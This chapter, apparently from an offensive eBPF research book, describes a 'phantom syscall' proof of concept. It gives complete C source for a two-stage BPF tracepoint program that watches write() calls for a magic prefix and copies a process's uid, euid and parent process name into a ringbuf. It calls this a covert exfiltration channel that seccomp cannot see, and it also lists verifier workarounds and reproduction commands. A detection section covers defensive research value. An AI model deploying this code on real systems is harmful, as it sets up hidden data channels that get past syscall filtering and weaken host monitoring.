---
layout: book
title: "Chapter 4: The Phantom Syscall"
date: 2025-02-03
---

# Chapter 4: The Phantom Syscall

> **See also**: [Blog post]({{ site.baseurl }}/the-phantom-syscall.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch04-phantom-syscall) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Proof status**: `ch04-phantom-syscall` has been proved on Ubuntu 6.17.0 aarch64 (Lima VM, kernel 6.17.0-29-generic). No code changes were required.

I was trying to see how far a tail-called BPF program could walk `task_struct` from a tracepoint on `sys_enter_write` before the verifier got unhappy. The idea was simple: a regular `write()` syscall carrying a magic prefix fires the tracepoint, which tail-calls a second stage that reads kernel-internal credential fields and exfils them via ringbuf. One syscall, three kernel-private values out.

What surprised me was how little the verifier pushed back. Reading `task->cred->uid`, `task->cred->euid`, and `task->real_parent->comm` through `BPF_CORE_READ` all went through. What it rejected were writes to `task_struct` — for instance, trying to swap `cred` pointers. So this is exfiltration, not privilege escalation, which is exactly the line BPF was drawn along: you can observe kernel state, you can't mutate the core task state.

The interesting part of the threat model is how ordinary the target is. `write()` sits in every seccomp profile. Block it and the process dies; alert on it and you drown in noise. And a seccomp filter can't see the buffer anyway — `seccomp_data` doesn't carry the dereferenced bytes behind the user pointer. So a `write()` with a magic prefix in its buffer is a permitted syscall whose payload the filter never gets to look at.

## Mechanism

The design splits into two stages to stay under the verifier's stack budget — a limit I ran headfirst into on the first attempt (more on that below). Stage 1 does the cheap work: spot the magic prefix and dispatch. Stage 2 does the expensive work: walk `task_struct` and emit the event.

### Stage 1; syscall tracepoint detects magic prefix

```c
SEC("tracepoint/syscalls/sys_enter_write")
int tp_write(struct trace_event_raw_sys_enter *ctx) {
    const char __user *buf = (const char __user *)ctx->args[1];
    size_t len = (size_t)ctx->args[2];

    char magic[8];
    if (len < sizeof(magic)) return 0;
    if (bpf_probe_read_user(magic, sizeof(magic), buf) < 0) return 0;
    if (__builtin_memcmp(magic, "PHANTOM\0", 8) != 0) return 0;

    // tail-call into stage 2
    bpf_tail_call(ctx, &jumps, 0);
    return 0;
}
```

### Stage 2; read kernel cred + parent comm, emit ringbuf

```c
SEC("tracepoint/syscalls/sys_enter_write")
int tp_write_stage2(struct trace_event_raw_sys_enter *ctx) {
    struct task_struct *task = (void *)bpf_get_current_task();

    u32 uid  = BPF_CORE_READ(task, cred, uid.val);
    u32 euid = BPF_CORE_READ(task, cred, euid.val);

    char parent_comm[16] = {};
    struct task_struct *parent = BPF_CORE_READ(task, real_parent);
    BPF_CORE_READ_STR_INTO(&parent_comm, parent, comm);

    char payload[48] = {};
    bpf_probe_read_user(payload, sizeof(payload),
                        (void *)ctx->args[1] + 8);  // skip magic

    struct evt e = { .pid = bpf_get_current_pid_tgid() >> 32,
                     .uid = uid, .euid = euid };
    __builtin_memcpy(e.parent, parent_comm, 16);
    __builtin_memcpy(e.payload, payload, 48);
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);
    return 0;
}
```

The loader registers stage 2 in a `BPF_MAP_TYPE_PROG_ARRAY` at slot 0 before attaching stage 1. This is where the one non-obvious call comes in: without `bpf_program__set_autoattach(stage2, false)`, libbpf attaches stage 2 straight to the same tracepoint on its own, and then every `write()` emits an event. Disabling autoattach is load-bearing.

The two stages also have to share a section type. My first attempt declared stage 2 as `SEC("raw_tp/sys_enter_write")`, and the prog array update failed with `tail_call: program type mismatch`. `SEC("tp/...")` programs are `BPF_PROG_TYPE_TRACEPOINT`; `SEC("raw_tp/...")` programs are `BPF_PROG_TYPE_RAW_TRACEPOINT`; and a PROG_ARRAY only accepts programs of the same type as its caller.

## Hook points

- `tracepoint/syscalls/sys_enter_write` (stage 1); magic prefix detection + tail-call.
- `tracepoint/syscalls/sys_enter_write` (stage 2, manual-attach); cred/parent reads + ringbuf emit.

## Verifier friction during development

Three things caused the most grief during development, each for a different reason.

**Stack budget.** The first version put both stages in one handler. The verifier returned `-E2BIG` with `processed stack usage: 528`. The budget is 512. The staged design with per-CPU scratch solves this: the event struct lives in the map across the tail call, and neither stage has it on its stack.

**Unbounded reads.** The first payload copy was `bpf_probe_read_user(&e->payload, len - 8, buf + 8)`. The verifier rejected with `R3 unbounded memory access` because `len - 8` is not proven bounded. The clamp `if (plen > sizeof(e->payload) - 1) plen = sizeof(e->payload) - 1` fixes it.

**PTR_TO_BTF_ID_OR_NULL.** An early draft wrote `s->uid = t->cred->uid.val` directly. The verifier rejected with `R2 type=ptr_or_null_ expected=ptr_`. `BPF_CORE_READ` expands to `bpf_probe_read_kernel` calls that the verifier accepts without a NULL check.

None of these is the verifier being obtuse — each one maps to a real safety property. The stack budget stops unbounded stack growth across tail calls. The bounded-access rule stops out-of-bounds reads from user memory. The NULL-check rule stops kernel crashes on a NULL dereference. The friction is the point.

## Reproduction

```bash
cd dBPF-pocs/pocs/ch04-phantom-syscall
make
sudo ./build/ch04-phantom-syscall &
# in a separate shell as an unprivileged user
sudo -u nobody /tmp/phantom  # writes "PHANTOM\0<payload>"
# expect:
# [phantom] pid=... uid=65534 euid=65534 parent=bash
#           payload='hello-from-unprivileged-user'
```

The unprivileged process issues exactly one `write()`. From its own userspace perspective, it never had access to `task->real_parent->comm`. With the loader running, all three fields are out.

## Detection

- `bpftool prog list` shows both stages and the PROG_ARRAY.
- `bpftool link list | grep tracepoint` shows two links on `syscalls/sys_enter_write`; the signature of the staged design.
- `/sys/kernel/debug/tracing/events/syscalls/sys_enter_write/enable` will be set.
- Any seccomp filter that audits `bpf(2)` syscalls will see stage 2 being loaded.
- Behavioral: the stage-1 gate runs on every `write()` on the host. At 120 ns/invocation on a busy host issuing 1M writes/sec, the overhead is 120 ms/sec on the relevant core; measurable with `perf stat -e bpf_trace_enter`.

## Scope

This is a Class III primitive from chapter 20 (ringbuf exfil). Nothing in the kernel changes; three kernel-private fields are copied out. Seccomp that allows `write()` sees one syscall — which is exactly what seccomp was designed to see, and it still holds as designed. This primitive just lives in the gap that design leaves open.

One caveat on the attacker model: the triggering process has to know the magic prefix, so this isn't passive exfiltration out of an unwitting process. It's a covert channel between two processes that already agreed on a protocol. The `write()` completes normally and the tracepoint side-effect is invisible to the caller. The point isn't raw power — Chapter 1's LSM flipper is the stronger tool — it's the shape: nothing at the syscall-filter layer can see it, and it leaves no kernel-side anomaly a responder would notice without inspecting the loaded BPF programs directly.
